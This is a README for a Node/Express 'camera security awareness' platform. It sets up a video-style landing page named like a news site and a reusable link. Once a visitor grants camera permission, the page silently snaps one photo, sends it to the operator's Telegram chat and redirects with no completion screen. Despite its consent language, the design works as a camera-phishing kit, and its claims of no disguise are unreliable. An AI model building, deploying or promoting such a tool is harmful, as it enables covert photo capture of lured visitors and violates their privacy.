# Cross-Platform Camera Security Demonstration Platform

[![Node.js](https://img.shields.io/badge/Node.js-%3E%3D18.0.0-339933?logo=node.js&logoColor=white)](https://nodejs.org/)
[![Express](https://img.shields.io/badge/Express-4.21.2-000000?logo=express&logoColor=white)](https://expressjs.com/)
[![SQLite](https://img.shields.io/badge/Database-SQLite%20Persistent-003B57?logo=sqlite&logoColor=white)](https://www.sqlite.org/)
[![Telegram Bot API](https://img.shields.io/badge/Telegram-Bot%20API%20sendPhoto-26A5E4?logo=telegram&logoColor=white)](https://core.telegram.org/bots/api#sendphoto)
[![Tests](https://img.shields.io/badge/Tests-46%20Passed-brightgreen)](https://nodejs.org/api/test.html)

A professional, consent-based Phishing & Camera Security Awareness Demonstration platform designed to evaluate browser permission models and social engineering recognition across desktop and mobile devices.

The platform provides a modern, video-style landing page with video playback simulation, thumbnails, and advertisement-style content, with zero camera access on initial page load or ordinary video playback. A separate, clearly disclosed **Phishing Awareness Simulation** allows visitors to understand how misleading pages lure users and how browser security protects them:
- **Safe Simulation Mode**: Uses a prerecorded synthetic test graphic (100% safe, zero camera hardware access).
- **Live Hardware Gate Mode**: Clearly discloses the automatic photo flow. Continue invokes the browser's native camera permission prompt; if permission is granted, one photo is captured and sent to Telegram automatically without a preview or another confirmation.
- **Awareness Debrief**: Explains critical red flags (context mismatch, social engineering lures, native permission gates, hardware LED status) and reviews non-sensitive demonstration telemetry (`page_opened`, `demo_button_clicked`, `simulation_completed`).

> [!IMPORTANT]
> **Strict Consent Protocol**: This is an educational security awareness platform. It incorporates **zero hidden capture**, **no covert tracking**, **no permission bypasses**, and **no disguise of camera access as video playback**. All camera access is clearly disclosed on a dedicated demonstration page and strictly respects browser permission gates.

---

## Live Deployments

- **Frontend (Vercel)**: [https://news-kerala-vision-malayalam-fronte-five.vercel.app](https://news-kerala-vision-malayalam-fronte-five.vercel.app)
- **Backend API (Render)**: [https://news-kerala-vision-malayalam.onrender.com](https://news-kerala-vision-malayalam.onrender.com/)

---

## Browser Compatibility

| Platform | Browsers | Support | Notes |
| :--- | :--- | :--- | :--- |
| **Apple iOS & iPadOS** | Safari, Chrome, Edge, Firefox | Supported | Requires HTTPS. Supported permission prompt. |
| **Android** | Chrome, Firefox, Edge, Brave, Samsung Internet | Supported | Requires HTTPS. Native permission prompt. |
| **Windows Desktop** | Chrome, Edge, Firefox, Brave, Opera | Supported | Hardware indicator light auditing. |
| **macOS Desktop** | Safari, Chrome, Firefox, Edge | Supported | Green indicator light turns off immediately on capture. |
| **Linux Desktop** | Chrome, Firefox | Supported | Standard V4L2 device security testing. |

---

## Architectural Overview

The repository is organized into two decoupled applications:

```text
├── frontend/                     # Static HTML5/CSS3/Vanilla JS (Vercel or GitHub Pages)
│   ├── index.html                # Video-style landing page (thumbnail, video player, ad content)
│   ├── demo.html                 # Separate educational camera awareness test (no live preview)
│   ├── admin.html                # Administrator console & session manager
│   ├── style.css                 # Dark navy & slate security design system
│   ├── app.js                    # Admin dashboard logic, session polling & link copying
│   ├── demo.js                   # Landing page video loop & camera snapshot / delivery logic
│   └── config.js                 # Public backend URL resolver (Zero secrets)
├── backend/                      # Production Node.js & Express REST API
│   ├── server.js                 # Express server with Helmet, CORS & Rate Limiting
│   ├── package.json              # Backend dependencies & test scripts
│   ├── .env.example              # Environment variables template
│   ├── routes/
│   │   ├── sessions.js           # Session generation, verification & revocation
│   │   └── photos.js             # Multipart upload, MIME check & Telegram delivery
│   ├── services/
│   │   ├── db.js                 # Persistent SQLite database layer
│   │   └── telegram.js           # Telegram Bot API sendPhoto integration
│   ├── middleware/
│   │   ├── auth.js               # Timing-safe Administrator API key middleware
│   │   └── errorHandler.js       # Centralized error & 404 handler
│   └── tests/                    # Automated test suites (node:test & Supertest)
│       ├── sessions.test.js      # Session lifecycle & authentication tests
│       ├── photos.test.js        # Photo submission & Mocked Telegram tests
│       └── security.test.js      # CORS, Helmet & health check tests
├── docs/                         # In-depth operational guides
│   ├── API_DOCUMENTATION.md      # Full REST API specification with examples
│   ├── GITHUB_PAGES_DEPLOYMENT.md# Guide for hosting frontend on GitHub Pages
│   ├── BACKEND_DEPLOYMENT.md     # Production deployment (Render, Railway, VPS)
│   ├── TELEGRAM_BOT_SETUP.md     # Step-by-step BotFather & Chat ID guide
│   ├── SECURITY_CHECKLIST.md     # Comprehensive security & privacy checklist
│   └── TROUBLESHOOTING.md        # Camera permissions & Telegram error solutions
└── .github/workflows/
    └── deploy-frontend.yml       # Automated GitHub Pages CI/CD workflow
```

---

## Quick Start (Local Setup)

### 1. Prerequisites
- **Node.js** >= 18.0.0 (Node 20+ recommended)
- A **Telegram account** (for receiving submitted photos)

---

### 2. Configure & Start the Backend

1. Navigate to the backend directory:
   ```bash
   cd backend
   ```
2. Install dependencies:
   ```bash
   npm install
   ```
3. Create your `.env` configuration:
   ```bash
   cp .env.example .env
   ```
4. Open `.env` and fill in your credentials:
   ```env
   PORT=4000
   NODE_ENV=development
   ADMIN_API_KEY=my_secure_admin_password_12345
   TELEGRAM_BOT_TOKEN=7123456789:AAFlxyz-ExampleBotToken
   TELEGRAM_CHAT_ID=987654321
   FRONTEND_ORIGIN=http://localhost:3000,http://localhost:5500
   DATABASE_PATH=data/sessions.db
   DEMO_SESSION_DURATION_MINUTES=30
   ```
   *(See [docs/TELEGRAM_BOT_SETUP.md](docs/TELEGRAM_BOT_SETUP.md) for how to get your Bot Token and Chat ID in 2 minutes).*

5. Start the backend:
   ```bash
   npm start
   ```
   The backend will start at `http://localhost:4000`. Test health at:
   ```text
   http://localhost:4000/api/health
   ```

---

### 3. Launch the Frontend

You can serve the `frontend/` directory with any static file server:

```bash
# Using Python (built-in on Windows/macOS/Linux)
python -m http.server 3000 --directory frontend

# OR using Node's npx serve
npx -y serve frontend -p 3000
```

1. Open your browser to the **Admin Dashboard**:
   ```text
   http://localhost:3000/admin.html
   ```
2. In **Backend & Credentials**, enter your `ADMIN_API_KEY` and click **Save Settings**.
3. In **Permanent Reusable Demo Link**, create or copy the link once. It stays valid until an administrator disables or revokes it.
4. Each visit receives a separate, time-limited session. The notice explains that tapping Continue requests camera access and, after native permission is granted, automatically captures and submits one photo. Denying or cancelling permission sends nothing.

---

## Demonstration Workflow

```mermaid
sequenceDiagram
    autonumber
    actor Visitor
    participant Landing as Video Landing Page (index.html)
    participant DemoPage as Camera Test Page (demo.html)
    participant Browser as Device / Browser
    participant Backend as Render Backend API
    participant Telegram as Telegram Bot API

    Visitor->>Landing: Visits landing page
    Landing->>Visitor: Plays educational video animation & shows tech content (Zero camera access)
    Visitor->>DemoPage: Navigates to separate Educational Camera Security Test
    DemoPage->>Visitor: Discloses camera access, one automatic photo, and Telegram delivery
    Visitor->>DemoPage: Chooses Continue
    DemoPage->>Browser: Requests navigator.mediaDevices.getUserMedia()
    Browser->>Visitor: Displays native browser camera permission dialog
    Visitor->>Browser: Approves camera permission
    DemoPage->>Browser: Captures exactly one photo after permission
    DemoPage->>Browser: Stops camera tracks immediately after capture
    Browser-->>Visitor: Device camera indicator / green dot turns off
    DemoPage->>Backend: Automatically POSTs /api/sessions/:id/photo (Multipart JPEG)
    Backend->>Telegram: sendPhoto(photoBuffer, caption)
    Telegram-->>Backend: 200 OK (Delivered)
    Backend-->>DemoPage: 200 OK (Submission confirmed)
    DemoPage->>Visitor: Redirects after the server confirms submission, with no completion screen
```

---

## Running Automated Tests

The backend includes a comprehensive automated test suite testing session issuance, expiration, revocation, timing-safe authentication, image validation, rate limiting, and Telegram API mocking:

```bash
cd backend
npm test
```

The current suite covers backend and browser-flow tests, including automatic single-photo submission, denied permission handling, permanent-link lifecycle, database reopen persistence, preflight handling, and five independent visitor sessions.

---

## Detailed Documentation Guides

- **[Telegram Bot Setup Guide](docs/TELEGRAM_BOT_SETUP.md)**: How to create a bot with BotFather, start the conversation, and find your Chat ID.
- **[GitHub Pages Deployment Guide](docs/GITHUB_PAGES_DEPLOYMENT.md)**: How to publish the frontend to GitHub Pages with automatic subpath handling.
- **[Backend Production Deployment Guide](docs/BACKEND_DEPLOYMENT.md)**: Deploying to Render, Railway, or Linux VPS with persistent volumes and CORS.
- **[Vercel Deployment Guide](docs/VERCEL_DEPLOYMENT.md)**: Configure the static frontend project and API URL.
- **[REST API Documentation](docs/API_DOCUMENTATION.md)**: Detailed endpoint schemas, request parameters, responses, and error codes.
- **[Security Checklist](docs/SECURITY_CHECKLIST.md)**: Review of security measures, consent architecture, and secrets isolation.
- **[Troubleshooting Guide](docs/TROUBLESHOOTING.md)**: Fix camera permission prompts on iOS/Android and solve Telegram error codes.

---

## License

This project is open-source under the [MIT License](LICENSE).
